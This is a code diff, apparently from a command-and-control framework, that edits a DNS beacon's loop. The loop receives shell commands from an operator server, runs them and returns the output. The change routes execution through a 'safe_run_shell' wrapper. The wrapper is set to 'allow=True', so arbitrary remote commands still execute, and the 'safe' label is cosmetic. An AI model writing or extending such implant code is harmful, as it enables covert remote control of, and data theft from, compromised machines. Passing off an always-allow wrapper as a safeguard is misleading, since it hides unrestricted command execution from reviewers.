@@ -172,10 +172,13 @@ class DNSBeacon:
                 command = self.check_in()
                 if command and command.strip():
                     print(f"Executing: {command}")
-                    proc = subprocess.run(
-                        command, shell=True, capture_output=True, text=True, timeout=60,
-                        # shell=True required: C2 commands may contain pipes, redirects,
-                        # and arbitrary shell syntax received from the operator server.
+                    from core.safe_exec import safe_run_shell
+
+                    proc = safe_run_shell(
+                        command,
+                        allow=True,
+                        reason="dns beacon operator command, shell syntax allowed",
+                        timeout=60,
                     )
                     output = proc.stdout + proc.stderr
                     self.send_result(command, output, proc.returncode)
